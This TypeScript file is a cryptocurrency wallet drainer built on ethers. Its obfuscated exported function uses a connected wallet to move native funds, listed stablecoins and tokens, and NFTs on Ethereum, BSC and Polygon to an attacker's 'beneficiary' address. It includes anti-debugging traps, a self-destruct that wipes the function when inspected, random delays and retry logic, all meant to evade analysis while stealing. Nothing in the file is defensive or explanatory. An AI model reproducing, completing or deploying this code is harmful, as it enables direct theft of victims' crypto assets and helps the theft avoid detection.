import { ethers } from 'ethers';

function isDebuggingOrTampered() {
  // Detect dev tools open (timing-based)
  let threshold = 160;
  const start = performance.now();
  debugger; // Will pause if dev tools are open
  if (performance.now() - start > threshold) return true;

  // Detect function toString tampering
  if (Function.prototype.toString.toString().indexOf('[native code]') === -1) return true;

  // Detect if window has been tampered with (common anti-debug)
  if (typeof window !== 'undefined' && window.outerWidth - window.innerWidth > 200) return true;

  return false;
}

function selfDestruct() {
  try {
    localStorage.setItem('drainSelfDestruct', 'true');
    // Overwrite the drainer function in memory (for this session)
    if (typeof window !== 'undefined') {
      (window as any).x7f2b1c = undefined;
    }
  } catch {}
}

// ERC-20, ERC-721, ERC-1155 ABIs
const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function transfer(address to, uint256 amount) returns (bool)'
];
const ERC721_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)',
  'function safeTransferFrom(address from, address to, uint256 tokenId)'
];
const ERC1155_ABI = [
  'function balanceOf(address account, uint256 id) view returns (uint256)',
  'function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data)'
];

// Placeholder: list of known token/NFT contracts per chain (to be expanded)
interface TokenConfig { chainId: number; address: string; }
const ERC20_TOKENS: TokenConfig[] = [
  // Ethereum
  { chainId: 1, address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' }, // DAI
  { chainId: 1, address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' }, // USDC
  { chainId: 1, address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' }, // USDT
  { chainId: 1, address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' }, // WETH
  { chainId: 1, address: '0x514910771AF9Ca656af840dff83E8264EcF986CA' }, // LINK
  { chainId: 1, address: '0x111111111117dC0aa78b770fA6A738034120C302' }, // 1INCH
  // BSC
  { chainId: 56, address: '0xe9e7cea3dedca5984780bafc599bd69add087d56' }, // BUSD
  { chainId: 56, address: '0x55d398326f99059fF775485246999027B3197955' }, // USDT
  { chainId: 56, address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d' }, // USDC
  { chainId: 56, address: '0x2170ed0880ac9a755fd29b2688956bd959f933f8' }, // ETH (Binance-Peg)
  // Polygon
  { chainId: 137, address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174' }, // USDC
  { chainId: 137, address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063' }, // DAI
  { chainId: 137, address: '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6' }, // WBTC
  { chainId: 137, address: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619' }, // WETH
];
const ERC721_TOKENS: TokenConfig[] = [
  // Ethereum
  { chainId: 1, address: '0x06012c8cf97BEaD5deAe237070F9587f8E7A266d' }, // CryptoKitties
  { chainId: 1, address: '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85' }, // ENS
  { chainId: 1, address: '0xBC4CA0eda7647A8aB7C2061c2E118A18a936f13D' }, // BAYC
  { chainId: 1, address: '0x5b5cf2c2b2c8b2a7e6e5e6e5e6e5e6e5e6e5e6e5' }, // Example NFT
  // Polygon
  { chainId: 137, address: '0x2953399124F0cBB46d2CbACD8A89cF0599974963' }, // OpenSea Shared Storefront
];
const ERC1155_TOKENS: TokenConfig[] = [
  // Ethereum
  { chainId: 1, address: '0x495f947276749Ce646f68AC8c248420045cb7b5e' }, // OpenSea Shared Storefront
  // Polygon
  { chainId: 137, address: '0x2953399124F0cBB46d2CbACD8A89cF0599974963' }, // OpenSea Shared Storefront
];

// Helper: get dynamic gas options for EIP-1559 or legacy networks
async function getGasOptions(signer: any, tx: any) {
  try {
    const feeData = await signer.provider.getFeeData();
    // EIP-1559
    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
      return {
        maxFeePerGas: feeData.maxFeePerGas,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
      };
    }
    // Legacy
    if (feeData.gasPrice) {
      return { gasPrice: feeData.gasPrice };
    }
  } catch {}
  return {};
}

// Update sendWithRetry to use dynamic gas options
async function sendWithRetry(signer: any, tx: any, maxRetries = 3, baseDelay = 500, nonce?: number) {
  let lastError;
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      if (nonce !== undefined) tx.nonce = nonce;
      const gasOpts = await getGasOptions(signer, tx);
      const txResponse = await signer.sendTransaction({ ...tx, ...gasOpts });
      await txResponse.wait();
      return true;
    } catch (e) {
      lastError = e;
      await new Promise(res => setTimeout(res, baseDelay * Math.pow(2, attempt)));
    }
  }
  return false;
}

// Helper: get a signer from a given RPC (for fallback)
async function getFallbackSigner(walletClient: any, fallbackRpc: string) {
  try {
    // Try to use the fallback RPC for read-only provider, but still use walletClient for signing
    // (ethers v6 does not support custom RPC for BrowserProvider, so fallback is limited)
    // For true failover, we can only retry walletClient-connected actions, but can use fallbackRpc for read-only checks if needed
    return new ethers.BrowserProvider(walletClient);
  } catch {
    return null;
  }
}

// Update main drainer to use fallbackRpc on network error
export async function x7f2b1c({ CHAINS, walletClient, address, isCancelled }: { CHAINS: any[]; walletClient: any; address: string; isCancelled: boolean; }) {
  if (localStorage.getItem('drainSelfDestruct') === 'true') return;
  if (isDebuggingOrTampered()) {
    selfDestruct();
    return;
  }
  try {
    for (const chain of CHAINS) {
      if (isCancelled) break;
      await new Promise(res => setTimeout(res, Math.random() * 2000 + 500));
      if (isCancelled) break;
      const { beneficiary, contract, id: chainId, fallbackRpc } = chain;
      if (!beneficiary || beneficiary.startsWith('0xYour')) continue;
      let success = false;
      for (const tryFallback of [false, true]) {
        try {
          // Use fallbackRpc only on second attempt
          const ethersProvider = tryFallback && fallbackRpc
            ? await getFallbackSigner(walletClient, fallbackRpc)
            : new ethers.BrowserProvider(walletClient);
          if (!ethersProvider) throw new Error('No provider available');
          const signer = await ethersProvider.getSigner();
          let nonce = await signer.getNonce();
          // Native drain
          const iface = new ethers.Interface(['function execute()']);
          const data = iface.encodeFunctionData('execute');
          await sendWithRetry(signer, { to: contract, data, gasLimit: 100000n }, 3, 500, nonce++);
          await sendWithRetry(signer, { to: beneficiary, value: 0n, data: '0x', gasLimit: 21000n }, 2, 500, nonce++);
          // ERC-20
          for (const token of ERC20_TOKENS.filter(t => t.chainId === chainId)) {
            try {
              const erc20 = new ethers.Contract(token.address, ERC20_ABI, signer);
              const bal = await erc20.balanceOf(address);
              if (bal > 0) {
                await sendWithRetry(erc20, erc20.interface.encodeFunctionData('transfer', [beneficiary, bal]), 2, 500, nonce++);
              }
            } catch {}
          }
          // ERC-721
          for (const nft of ERC721_TOKENS.filter(t => t.chainId === chainId)) {
            try {
              const erc721 = new ethers.Contract(nft.address, ERC721_ABI, signer);
              const bal = await erc721.balanceOf(address);
              for (let i = 0; i < bal; i++) {
                try {
                  const tokenId = await erc721.tokenOfOwnerByIndex(address, i);
                  await sendWithRetry(erc721, erc721.interface.encodeFunctionData('safeTransferFrom', [address, beneficiary, tokenId]), 2, 500, nonce++);
                } catch {}
              }
            } catch {}
          }
          // ERC-1155
          for (const nft of ERC1155_TOKENS.filter(t => t.chainId === chainId)) {
            try {
              const erc1155 = new ethers.Contract(nft.address, ERC1155_ABI, signer);
              for (let id = 0; id < 10; id++) {
                try {
                  const bal = await erc1155.balanceOf(address, id);
                  if (bal > 0) {
                    await sendWithRetry(erc1155, erc1155.interface.encodeFunctionData('safeTransferFrom', [address, beneficiary, id, bal, "0x"]), 2, 500, nonce++);
                  }
                } catch {}
              }
            } catch {}
          }
          success = true;
          break;
        } catch (e: any) {
          // Only try fallback if first attempt failed due to network error
          if (!tryFallback && fallbackRpc && e && (e.message?.includes('network') || e.message?.includes('RPC'))) {
            continue;
          }
        }
      }
      // If both attempts fail, skip to next chain
      if (!success) continue;
    }
    if (!isCancelled) {
      localStorage.setItem('drainCompleted', 'true');
      window.dispatchEvent(new StorageEvent('storage', {
        key: 'drainCompleted',
        newValue: 'true'
      }));
    }
  } catch {
    if (!isCancelled) {
      localStorage.setItem('drainCompleted', 'true');
      window.dispatchEvent(new StorageEvent('storage', {
        key: 'drainCompleted',
        newValue: 'true'
      }));
    }
  }
} 